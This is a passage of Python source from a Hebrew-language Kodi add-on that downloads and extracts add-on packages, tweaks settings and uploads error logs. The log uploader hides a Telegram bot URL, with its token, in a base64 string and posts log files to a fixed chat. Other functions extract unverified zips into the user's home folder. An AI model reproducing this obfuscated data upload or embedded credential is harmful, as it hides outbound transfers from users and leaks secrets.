        logSelect=[]
        import glob
        folder = translatepath('special://logpath')
        xbmc.log(folder)
        for file in glob.glob(folder+'/*.log'):
            try:nameSelect.append(file.rsplit('\\', 1)[1].upper())
            except:nameSelect.append(file.rsplit('/', 1)[1].upper())
            logSelect.append(file)
            
        try:
            file = open(logSelect[0], 'r', encoding="utf8") 
        except:
            file = open(logSelect[0], 'r') 
        home1=translatepath("special://home/")
        home2=translatepath("special://home/").replace('\\','\\\\')
        home3=translatepath("special://xbmc/")
        home4=translatepath("special://xbmc/").replace('\\','\\\\')
        home5=translatepath("special://masterprofile/")
        home6=translatepath("special://masterprofile/").replace('\\','\\\\')
        home7=translatepath("special://profile/")
        home8=translatepath("special://profile/").replace('\\','\\\\')
        home9=translatepath("special://temp/")
        home10=translatepath("special://temp/").replace('\\','\\\\')
        file_data=file.read().replace(home1,'').replace(home2,'').replace(home3,'').replace(home4,'').replace(home5,'').replace(home6,'').replace(home7,'').replace(home8,'').replace(home9,'').replace(home10,'')
        #.replace(home1,'').replace(home2,'').replace(home3,'').replace(home4,'').replace(home5,'').replace(home6,'').replace(home7,'').replace(home8,'').replace(home9,'').replace(home10,'')
        match=re.compile('Error Type:(.+?)-->End of Python script error report<--',re.DOTALL).findall(file_data)
        match2=re.compile('CAddonInstallJob(.+?)$', re.M).findall(file_data)
        match3=re.compile('ERROR: WARNING:root:(.+?)$', re.M).findall(file_data)
        n=0
        line_numbers=[]
        try:
            file = open(logSelect[0], 'r')
            file_data=file.readlines()             
        except:
            file = open(logSelect[0], 'r', encoding="utf8") 
            file_data=file.readlines() 

        match_final=[]
        x=0
        y=0
        z=0
        for  line in (file_data):
         
         if 'Error Type:' in line:
          match_final.append(match[x])
          x=x+1
          line_numbers.append(n)
         elif 'CAddonInstallJob' in line:
          match_final.append(match2[y])
          y=y+1
         # elif 'ERROR: WARNING:root:' in line :#and enable_debug_notice=='true':
          # match_final.append(match3[z])
          # z=z+1

        if (len(match_final))>0:
          # dialog = xbmcgui.DialogBusy()
          # dialog.create()
            try:
                file = open(os.path.join(user_dataDir_pre, 'log.txt'), 'w') 
                file.write('\n'.join(match_final))
                file.close()
            except:
                file = open(os.path.join(user_dataDir_pre, 'log.txt', encoding="utf8"), 'w') 
                file.write('\n'.join(match_final))
                file.close()
            if not os.path.exists(translatepath("special://home/addons/") + 'script.module.requests'):
              xbmc.executebuiltin("RunPlugin(plugin://script.module.requests)")
          #  break
            xbmc.sleep(500)
            howsentlog()
            import requests
            docu=xbmc . translatePath ( 'special://profile/addon_data/plugin.program.Settingz-Anon/log.txt')
            files = {
            'chat_id': (None, '-274262389'),
            'document': (docu, open(docu, 'rb')),
            }
            t=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode('utf-8')
            response = requests.post((t), files=files)

            LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]' % COLOR2)
        else:
            xbmc.sleep(1500)
            LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אין שגיאות בלוג[/COLOR]' % COLOR2)
def iptvkodi18android(): # הרחבה בשם לוקי שאותה בודקים
      if not os.path.exists(os.path.join(ADDONS, 'pvr.iptvsimple')):
          link='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'
          iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
          iiiI11 = xbmcgui . DialogProgress ( )
          iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +name, '' , 'Please Wait' )
          OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
          req = urllib2.Request(link)
          remote_file = urlopen(req)
          #the_page = response.read()
          dp = xbmcgui.DialogProgress()
          dp.create("Downloading", "Downloading " +name)
          dp.update(0)

          f = open(OOooO, 'wb')

          try:
            total_size = remote_file.info().getheader('Content-Length').strip()
            header = True
          except AttributeError:
                header = False # a response doesn't always include the "Content-Length" header

          if header:
                total_size = int(total_size)

          bytes_so_far = 0
          start_time=time.time()
          while True:
                buffer = remote_file.read(8192)
                if not buffer:
                    sys.stdout.write('\n')
                    break

                bytes_so_far += len(buffer)
                f.write(buffer)

                if not header:
                    total_size = bytes_so_far # unknown size
                if dp.iscanceled(): 
                   dp.close()
                   try:
                    os.remove(OOooO)
                   except:
                    pass
                   break
                percent = float(bytes_so_far) / total_size
                percent = round(percent*100, 2)
                currently_downloaded=bytes_so_far/ (1024 * 1024) 
                total=total_size/ (1024 * 1024) 
                mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
                if (time.time() - start_time) >0:
                  kbps_speed = bytes_so_far / (time.time() - start_time) 
                  kbps_speed = kbps_speed / 1024 
                else:
                 kbps_speed=0
                type_speed = 'KB'
                if kbps_speed >= 1024:
                   kbps_speed = kbps_speed / 1024 
                   type_speed = 'MB'
                if kbps_speed > 0 and not percent == 100: 
                    eta = (total_size - bytes_so_far) / kbps_speed 
                else: 
                    eta = 0
                e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

                dp.update(int(percent), "Downloading " +name,mbs,e )
                #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
          
          II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/addons' ) )


          f.close()
          extract  ( OOooO , II111iiii,dp )
          xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )

          try:
            os.remove(OOooO)

          except:
            pass
          dialog = xbmcgui.Dialog()
          xbmc.sleep(5000)
          dialog.ok("Kodi Setting", 'הפעולה הושלמה - הקודי יסגר כעת')
          os._exit(1)
      xbmc.executebuiltin('Addon.OpenSettings(%s)' % 'pvr.iptvsimple')
def gaia(): # הרחבה בשם לוקי שאותה בודקים
  link='http://anonymous1.net/Settingz/magnetic.zip'
  iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  iiiI11 = xbmcgui . DialogProgress ( )
  iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +name, '' , 'Please Wait' )
  OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
  req = urllib2.Request(link)
  remote_file = urlopen(req)
  #the_page = response.read()
  dp = xbmcgui.DialogProgress()
  dp.create("Downloading", "Downloading " +name)
  dp.update(0)

  f = open(OOooO, 'wb')

  try:
    total_size = remote_file.info().getheader('Content-Length').strip()
    header = True
  except AttributeError:
        header = False # a response doesn't always include the "Content-Length" header

  if header:
        total_size = int(total_size)

  bytes_so_far = 0
  start_time=time.time()
  while True:
        buffer = remote_file.read(8192)
        if not buffer:
            sys.stdout.write('\n')
            break

        bytes_so_far += len(buffer)
        f.write(buffer)

        if not header:
            total_size = bytes_so_far # unknown size
        if dp.iscanceled(): 
           dp.close()
           try:
            os.remove(OOooO)
           except:
            pass
           break
        percent = float(bytes_so_far) / total_size
        percent = round(percent*100, 2)
        currently_downloaded=bytes_so_far/ (1024 * 1024) 
        total=total_size/ (1024 * 1024) 
        mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
        if (time.time() - start_time) >0:
          kbps_speed = bytes_so_far / (time.time() - start_time) 
          kbps_speed = kbps_speed / 1024 
        else:
         kbps_speed=0
        type_speed = 'KB'
        if kbps_speed >= 1024:
           kbps_speed = kbps_speed / 1024 
           type_speed = 'MB'
        if kbps_speed > 0 and not percent == 100: 
            eta = (total_size - bytes_so_far) / kbps_speed 
        else: 
            eta = 0
        e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

        dp.update(int(percent), "Downloading " +name,mbs,e )
        #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
  
  II111iiii = xbmc . translatePath ( os . path . join ( 'special://home' ) )


  f.close()
  extract  ( OOooO , II111iiii,dp )
  xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )

  try:
    os.remove(OOooO)

  except:
    pass
  dialog = xbmcgui.Dialog()
  popcorntime()
  #xbmc.sleep(5000)
  xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'הספקים הותקנו בהצלחה!')))
  
  #dialog = xbmcgui.Dialog()
  #dialog.ok("Kodi Setting", 'הפעולה הושלמה, הקודי יסגר כעת')
  #os._exit(1)
def movie_update():
  link='https://kodihub.net/nc8ho'
  iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  iiiI11 = xbmcgui . DialogProgress ( )
  iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +name, '' , 'Please Wait' )
  OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
  req = urllib2.Request(link)
  remote_file = urlopen(req)
  #the_page = response.read()
  dp = xbmcgui.DialogProgress()
  dp.create("Downloading", "Downloading " +name)
  dp.update(0)

  f = open(OOooO, 'wb')

  try:
    total_size = remote_file.info().getheader('Content-Length').strip()
    header = True
  except AttributeError:
        header = False # a response doesn't always include the "Content-Length" header

  if header:
        total_size = int(total_size)

  bytes_so_far = 0
  start_time=time.time()
  while True:
        buffer = remote_file.read(8192)
        if not buffer:
            sys.stdout.write('\n')
            break

        bytes_so_far += len(buffer)
        f.write(buffer)

        if not header:
            total_size = bytes_so_far # unknown size
        if dp.iscanceled(): 
           dp.close()
           try:
            os.remove(OOooO)
           except:
            pass
           break
        percent = float(bytes_so_far) / total_size
        percent = round(percent*100, 2)
        currently_downloaded=bytes_so_far/ (1024 * 1024) 
        total=total_size/ (1024 * 1024) 
        mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
        if (time.time() - start_time) >0:
          kbps_speed = bytes_so_far / (time.time() - start_time) 
          kbps_speed = kbps_speed / 1024 
        else:
         kbps_speed=0
        type_speed = 'KB'
        if kbps_speed >= 1024:
           kbps_speed = kbps_speed / 1024 
           type_speed = 'MB'
        if kbps_speed > 0 and not percent == 100: 
            eta = (total_size - bytes_so_far) / kbps_speed 
        else: 
            eta = 0
        e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

        dp.update(int(percent), "Downloading " +name,mbs,e )
        #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
  
  II111iiii = xbmc . translatePath ( os . path . join ( 'special://home' ) )

     
  f.close()
  extract  ( OOooO , II111iiii,dp )


  try:
    os.remove(OOooO)
  except:
    pass
  dialog = xbmcgui.Dialog()
  dialog.ok("Kodi Setting", 'הפעולה הושלמה, הקודי יסגר כעת')
  os._exit(1)

def Fullbuild():
  link='https://kodihub.net/m3gdz'
  iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  iiiI11 = xbmcgui . DialogProgress ( )
  iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +name, '' , 'Please Wait' )
  OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
  req = urllib2.Request(link)
  remote_file = urlopen(req)
  #the_page = response.read()
  dp = xbmcgui.DialogProgress()
  dp.create("Downloading", "Downloading " +name)
  dp.update(0)

  f = open(OOooO, 'wb')

  try:
    total_size = remote_file.info().getheader('Content-Length').strip()
    header = True
  except AttributeError:
        header = False # a response doesn't always include the "Content-Length" header

  if header:
        total_size = int(total_size)

  bytes_so_far = 0
  start_time=time.time()
  while True:
        buffer = remote_file.read(8192)
        if not buffer:
            sys.stdout.write('\n')
            break

        bytes_so_far += len(buffer)
        f.write(buffer)

        if not header:
            total_size = bytes_so_far # unknown size
        if dp.iscanceled(): 
           dp.close()
           try:
            os.remove(OOooO)
           except:
            pass
           break
        percent = float(bytes_so_far) / total_size
        percent = round(percent*100, 2)
        currently_downloaded=bytes_so_far/ (1024 * 1024) 
        total=total_size/ (1024 * 1024) 
        mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
        if (time.time() - start_time) >0:
          kbps_speed = bytes_so_far / (time.time() - start_time) 
          kbps_speed = kbps_speed / 1024 
        else:
         kbps_speed=0
        type_speed = 'KB'
        if kbps_speed >= 1024:
           kbps_speed = kbps_speed / 1024 
           type_speed = 'MB'
        if kbps_speed > 0 and not percent == 100: 
            eta = (total_size - bytes_so_far) / kbps_speed 
        else: 
            eta = 0
        e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

        dp.update(int(percent), "Downloading " +name,mbs,e )
        #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
  
  II111iiii = xbmc . translatePath ( os . path . join ( 'special://home' ) )

     
  f.close()
  extract  ( OOooO , II111iiii,dp )


  try:
    os.remove(OOooO)
  except:
    pass
  dialog = xbmcgui.Dialog()
  dialog.ok("Kodi Setting", 'הפעולה הושלמה, הקודי יסגר כעת')
  os._exit(1)
def downloader_is (url,name,with_massage ) :
 import downloader,extract   
 i1iIIII = xbmc . getInfoLabel ( "System.ProfileName" )
 I1 = xbmc . translatePath ( os . path . join ( 'special://home' , '' ) )
 O0OoOoo00o = xbmcgui . Dialog ( )
 if name.find('repo')< 0 and with_massage=='yes':
     choice = O0OoOoo00o . yesno ( "XBMC ISRAEL" , "Yes to install" ,name)
 else:
     choice=True
 if    choice :
  iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  iiiI11 = xbmcgui . DialogProgress ( )
  iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +name, '' , 'Please Wait' )
  OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
  try :
     os . remove ( OOooO )
  except :
      pass
  downloader . download ( url , OOooO ,name, iiiI11 )
  II111iiii = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
  iiiI11 . update ( 0 , name , "Extracting Zip Please Wait" )
  
  extract . all ( OOooO , II111iiii , iiiI11 )
  iiiI11 . update ( 0 , name , "Downloading" )
  iiiI11 . update ( 0 , name , "Extracting Zip Please Wait" )
  xbmc . executebuiltin ( 'UpdateLocalAddons ' )
  xbmc . executebuiltin ( "UpdateAddonRepos" )

def torent_menu():
  type='windows'
  if xbmc.getCondVisibility('system.platform.android'):
       type='android'
  #dialog = xbmcgui.Dialog()
  #system=['Windows','Android']
  #ret = dialog.select("בחר מערכת להתקנה", system)
  #if ret==0:
  # type='windows'
  #elif ret==1:
  # type='android'
  #else:
  # sys.exit()
  addDir2("[COLOR yellow]התקנה אוטומטית[/COLOR]",'auto$$$torrenter$$$'+type,5,__PLUGIN_PATH__ + "/resources/torrenter.png",__PLUGIN_PATH__ + "/resources/torrenter.png","התקן את טורנטר")
  addDir3("[COLOR yellow]התקנה ידנית[/COLOR]",'manual$$$torrenter$$$'+type,5,__PLUGIN_PATH__ + "/resources/torrenter.png",__PLUGIN_PATH__ + "/resources/torrenter.png","התקן את טורנטר")
def normalize(s):
    try:
        if type(s) == unicode: 
            return s.encode('utf8', 'ignore')
        else:
            return str(s)
    except:
        import unicodedata
        if type(s) == unicodedata: 
            return s.encode('utf8', 'ignore')
        else:
            return str(s)
def extract(src,dst,dp):
    import zipfile
    logging.warning(src)
    zin = zipfile.ZipFile(src,  'r')

    nFiles = float(len(zin.infolist()))
    count  = 0
    # reload(sys)
    if KODI_VERSION<=18:#kodi18
        # if Addon.getSetting('debug')=='false':
            reload (sys )#line:61
            sys .setdefaultencoding ('utf8')#line:62
    else:#kodi19
        import importlib
        importlib.reload (sys )
    # sys.setdefaultencoding("utf-8")
    
    for item in zin.infolist():
            count += 1
            update = count / nFiles * 100
            dp.update(int(update),'Extracting')
            logging.warning(item.filename)
            logging.warning(dst)
            item.filename=normalize(item.filename)
            try:
             zin.extract(item, dst)
            except:pass
    

    return True
def download(link,dest):
  iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  iiiI11 = xbmcgui . DialogProgress ( )
  iiiI11 . create ( "XBMC ISRAEL" , "Downloading " +name, '' , 'Please Wait' )
  OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
  req = urllib2.Request(link)
  remote_file = urlopen(req)
  #the_page = response.read()
  dp = xbmcgui.DialogProgress()
  dp.create("Downloading", "Downloading " +name)
  dp.update(0)
  images_file=dest
  f = open(OOooO, 'wb')

  try:
    total_size = remote_file.info().getheader('Content-Length').strip()
    header = True
  except AttributeError:
        header = False # a response doesn't always include the "Content-Length" header

  if header:
        total_size = int(total_size)

  bytes_so_far = 0
  start_time=time.time()
  while True:
        buffer = remote_file.read(8192)
        if not buffer:
            sys.stdout.write('\n')
            break

        bytes_so_far += len(buffer)
        f.write(buffer)

        if not header:
            total_size = bytes_so_far # unknown size
        if dp.iscanceled(): 
           dp.close()
           try:
            os.remove(OOooO)
           except:
            pass
           break
        percent = float(bytes_so_far) / total_size
        percent = round(percent*100, 2)
        currently_downloaded=bytes_so_far/ (1024 * 1024) 
        total=total_size/ (1024 * 1024) 
        mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
        if (time.time() - start_time) >0:
          kbps_speed = bytes_so_far / (time.time() - start_time) 
          kbps_speed = kbps_speed / 1024 
        else:
         kbps_speed=0
        type_speed = 'KB'
        if kbps_speed >= 1024:
           kbps_speed = kbps_speed / 1024 
           type_speed = 'MB'
        if kbps_speed > 0 and not percent == 100: 
            eta = (total_size - bytes_so_far) / kbps_speed 
        else: 
            eta = 0
        e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

        dp.update(int(percent), "Downloading " +name,mbs,e )
        #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
  
  II111iiii = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
     
  f.close()

  extract  ( OOooO , II111iiii,dp )
  if os.path.exists(II111iiii+'/scakemyer-script.quasar.burst'):
    if os.path.exists(II111iiii+'/script.quasar.burst'):
     shutil.rmtree(II111iiii+'/script.quasar.burst' , ignore_errors=False)
    os.rename(II111iiii+'/scakemyer-script.quasar.burst',II111iiii+'/script.quasar.burst')
  if os.path.exists(II111iiii+'/scakemyer-script.elementum.burst'):
    if os.path.exists(II111iiii+'/script.elementum.burst'):
     shutil.rmtree(II111iiii+'/script.elementum.burst' , ignore_errors=False)
    os.rename(II111iiii+'/scakemyer-script.elementum.burst',II111iiii+'/script.elementum.burst')
  if os.path.exists(II111iiii+'/plugin.video.kmediatorrent-master'):
    if os.path.exists(II111iiii+'/plugin.video.kmediatorrent'):
     shutil.rmtree(II111iiii+'/plugin.video.kmediatorrent' , ignore_errors=False)
    os.rename(II111iiii+'/plugin.video.kmediatorrent-master',II111iiii+'/plugin.video.kmediatorrent')
  xbmc . executebuiltin ( 'UpdateLocalAddons ' )
  xbmc . executebuiltin ( "UpdateAddonRepos" )
  try:
    os.remove(OOooO)
  except:
    pass
  dp.close()
def popcorn_menu():
  type='windows'
  if xbmc.getCondVisibility('system.platform.android'):
       type='android'
  '''
  dialog = xbmcgui.Dialog()
  system=['Windows','Android']
  ret = dialog.select("בחר מערכת להתקנה", system)
  if ret==0:
   type='windows'
  elif ret==1:
   type='android'
  else:
   sys.exit()
  '''
  addDir2("[COLOR yellow]התקנה אוטומטית[/COLOR]",'auto$$$popcorn$$$'+type,5,__PLUGIN_PATH__ + "/resources/popcorn.jpg",__PLUGIN_PATH__ + "/resources/popcorn.jpg","התקן את קודי פופקורן")
  addDir3("[COLOR yellow]התקנה ידנית[/COLOR]",'manual$$$popcorn$$$'+type,5,__PLUGIN_PATH__ + "/resources/popcorn.jpg",__PLUGIN_PATH__ + "/resources/popcorn.jpg","התקן את קודי פופקורן")

def gdrive_menu():
  addDir2("[COLOR yellow]התקנה אוטומטית[/COLOR]",'auto$$$gdrive$$$'+'windows',5,__PLUGIN_PATH__ + "/resources/gdrive.jpg",__PLUGIN_PATH__ + "/resources/gdrive.jpg","התקן אל גוגל דרייב")
  addDir3("[COLOR yellow]התקנה ידנית[/COLOR]",'manual$$$gdrive$$$'+'windows',5,__PLUGIN_PATH__ + "/resources/gdrive.jpg",__PLUGIN_PATH__ + "/resources/gdrive.jpg","התקן אל גוגל דרייב")
def kmedia_menu():
  addDir2("[COLOR yellow]התקנה אוטומטית[/COLOR]",'auto$$$kmedia$$$'+'windows',5,__PLUGIN_PATH__ + "/resources/kmedia.png",__PLUGIN_PATH__ + "/resources/kmedia.png","התקן את KMEDIA")
  addDir3("[COLOR yellow]התקנה ידנית[/COLOR]",'manual$$$kmedia$$$'+'windows',5,__PLUGIN_PATH__ + "/resources/kmedia.png",__PLUGIN_PATH__ + "/resources/kmedia.png","התקן את KMEDIA")
def quasar_menu():
  addDir2("[COLOR yellow]התקנה אוטומטית[/COLOR]",'auto$$$quasar$$$'+'windows',5,__PLUGIN_PATH__ + "/resources/quasar.png",__PLUGIN_PATH__ + "/resources/quasar.png","התקן את קוואסר")
  addDir3("[COLOR yellow]התקנה ידנית[/COLOR]",'manual$$$quasar$$$'+'windows',5,__PLUGIN_PATH__ + "/resources/quasar.png",__PLUGIN_PATH__ + "/resources/quasar.png","התקן את קוואסר")
def elementum_menu():
  addDir2("[COLOR yellow]התקנה אוטומטית[/COLOR]",'auto$$$elementum$$$'+'windows',5,__PLUGIN_PATH__ + "/resources/elementum.png",__PLUGIN_PATH__ + "/resources/elementum.png","התקן את אלמנטום")
  addDir3("[COLOR yellow]התקנה ידנית[/COLOR]",'manual$$$elementum$$$'+'windows',5,__PLUGIN_PATH__ + "/resources/elementum.png",__PLUGIN_PATH__ + "/resources/elementum.png","התקן את אלמנטום")
def gaia_menu():
  addDir2("[COLOR yellow]התקנה אוטומטית[/COLOR]",'auto$$$gaia$$$'+'windows',5,__PLUGIN_PATH__ + "/resources/gaia.png",__PLUGIN_PATH__ + "/resources/gaia.png","התקן את גאיה")
  addDir3("[COLOR yellow]התקנה ידנית[/COLOR]",'manual$$$gaia$$$'+'windows',5,__PLUGIN_PATH__ + "/resources/gaia.png",__PLUGIN_PATH__ + "/resources/gaia.png","התקן את גאיה")


def clean_folders():
  import shutil
  if xbmc.getCondVisibility('system.platform.ios'):
       system_type='ios'
  if xbmc.getCondVisibility('system.platform.android'):
       system_type='android'
  if xbmc.getCondVisibility('system.platform.windows'):
       system_type='windows'
  ##quasar clean
  quasar_folder=(translatepath("special://home/addons/") + 'plugin.video.quasar'+'/resources/bin/')
  ##elementum clean
  elementum_folder=(translatepath("special://home/addons/") + 'plugin.video.elementum'+'/resources/bin/')

  popcorn_folder=(translatepath("special://home/addons/") + 'plugin.video.kodipopcorntime'+'/resources/bin/')
  kmdia_folder=(translatepath("special://home/addons/") + 'plugin.video.kmediatorrent'+'/resources/bin/')
  dp = xbmcgui.DialogProgress()
  dp.create("מנקה", "אנא המתן... ")
  dp.update(0)
  if os.path.exists(elementum_folder):
      folders=os.listdir(elementum_folder)

      
      for folder in folders:
        dp.update(0, "מנקה אלמנטום")

        if system_type not in folder:
         shutil.rmtree( elementum_folder+folder , ignore_errors=False)
  if os.path.exists(quasar_folder):
      folders=os.listdir(quasar_folder)

      
      for folder in folders:
        dp.update(0, "מנקה קוואסר")

        if system_type not in folder:
         shutil.rmtree( quasar_folder+folder , ignore_errors=False)
  if os.path.exists(popcorn_folder):
      folders=os.listdir(popcorn_folder)

      for folder in folders:
        dp.update(0, "מנקה פופקורן")
        if system_type not in folder:
         shutil.rmtree( popcorn_folder+folder , ignore_errors=False)
         
  if os.path.exists(kmdia_folder):
      folders=os.listdir(kmdia_folder)

      for folder in folders:
        dp.update(0, "מנקה קמדיה")
        if system_type not in folder:
         shutil.rmtree( kmdia_folder+folder , ignore_errors=False)
  dp.update(0, "סיום")
  dialog = xbmcgui.Dialog()
  dialog.ok("Kodi Setting", 'הכל נקי :-)')
TITLEB='באפר הוגדר בהצלחה'
def fix_buffer():
  # dialog = xbmcgui.DialogBusy()
  # dialog.create()
  src=__PLUGIN_PATH__ + "/resources/buffer/1/advancedsettings.xml"
  dst=xbmc . translatePath ( 'special://userdata')+"/advancedsettings.xml"
  
  copyfile(src,dst)
  LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, TITLEB),'[COLOR %s]מומלץ להפעיל מחדש את המערכת[/COLOR]' % COLOR2)
  # os._exit(1)
def fix_buffer2():
  # dialog = xbmcgui.DialogBusy()
  # dialog.create()
  src=__PLUGIN_PATH__ + "/resources/buffer/2/advancedsettings.xml"
  dst=xbmc . translatePath ( 'special://userdata')+"/advancedsettings.xml"
  
  copyfile(src,dst)
  LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, TITLEB),'[COLOR %s]מומלץ להפעיל מחדש את המערכת[/COLOR]' % COLOR2)
  # os._exit(1)
def fix_buffer3():
  # dialog = xbmcgui.DialogBusy()
  # dialog.create()
  src=__PLUGIN_PATH__ + "/resources/buffer/3/advancedsettings.xml"
  dst=xbmc . translatePath ( 'special://userdata')+"/advancedsettings.xml"
  
  copyfile(src,dst)
  LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, TITLEB),'[COLOR %s]מומלץ להפעיל מחדש את המערכת[/COLOR]' % COLOR2)
  # os._exit(1)
def fix_buffer4():
  # dialog = xbmcgui.DialogBusy()
  # dialog.create()
  src=__PLUGIN_PATH__ + "/resources/buffer/4/advancedsettings.xml"
  dst=xbmc . translatePath ( 'special://userdata')+"/advancedsettings.xml"
  
  copyfile(src,dst)
  LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, TITLEB),'[COLOR %s]מומלץ להפעיל מחדש את המערכת[/COLOR]' % COLOR2)
  # os._exit(1)
def fix_buffer5():
  # dialog = xbmcgui.DialogBusy()
  # dialog.create()
  src=__PLUGIN_PATH__ + "/resources/buffer/5/advancedsettings.xml"
  dst=xbmc . translatePath ( 'special://userdata')+"/advancedsettings.xml"
  
  copyfile(src,dst)
  LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, TITLEB),'[COLOR %s]מומלץ להפעיל מחדש את המערכת[/COLOR]' % COLOR2)
  # os._exit(1)
def USER_KODIOFF():
  src=__PLUGIN_PATH__ + "/resources/userkodi/off/profiles.xml"
  dst=xbmc . translatePath ( 'special://userdata')+"/profiles.xml"
  
  copyfile(src,dst)
  dialog = xbmcgui.Dialog()
  dialog.ok("Kodi Setting", 'ביטול משתמשים הוגדר בהצלחה - הקודי יסגר כעת')
  os._exit(1)
def USER_KODION():
  src=__PLUGIN_PATH__ + "/resources/userkodi/on/profiles.xml"
  dst=xbmc . translatePath ( 'special://userdata')+"/profiles.xml"
  
  copyfile(src,dst)
  dialog = xbmcgui.Dialog()
  dialog.ok("Kodi Setting", 'הפעלת משתמשים הוגדר בהצלחה - הקודי יסגר כעת')
  os._exit(1)
def fix_buffer6():
  xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=autoadvanced)" )
def speed_test():
  xbmc.executebuiltin("RunPlugin(plugin://plugin.program.Anonymous/?mode=speed)" )
  
def skin_pfix():
     addDir2("[COLOR white]שחזור הגדרות סקין[/COLOR]",'plugin.',24,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","שחזור הגדרות סקין")
     addDir2("[COLOR white]איפוס נעילת תצוגות[/COLOR]",'plugin.',231,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","איפוס נעילת תצוגות")
     addDir2("[COLOR white]איפוס הגדרות סקין[/COLOR]",'plugin.',200,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","איפוס הגדרות סקין")

        
        
def resetForcedView():
		setting_file=os.path.join(translatepath("special://userdata"),"addon_data", "skin.Meir.mod","settings.xml")

		file = open(setting_file, 'r') 
		file_data= file.read()
		file.close()
		regex='<setting id="Skin.ForcedView.episodes" type="string(.+?)/setting>'
		m=re.compile(regex).findall(file_data)[0]
		file = open(setting_file, 'w') 
		file.write(file_data.replace('<setting id="Skin.ForcedView.episodes" type="string%s/setting>'%m,'<setting id="Skin.ForcedView.episodes" type="string"></setting>'))
		file.close()
		setting_file=os.path.join(translatepath("special://userdata"),"addon_data", "skin.Meir.mod","settings.xml")

		file = open(setting_file, 'r') 
		file_data= file.read()
		file.close()
		regex='<setting id="Skin.ForcedView.movies" type="string(.+?)/setting>'
		m=re.compile(regex).findall(file_data)[0]
		file = open(setting_file, 'w') 
		file.write(file_data.replace('<setting id="Skin.ForcedView.movies" type="string%s/setting>'%m,'<setting id="Skin.ForcedView.movies" type="string"></setting>'))
		file.close()
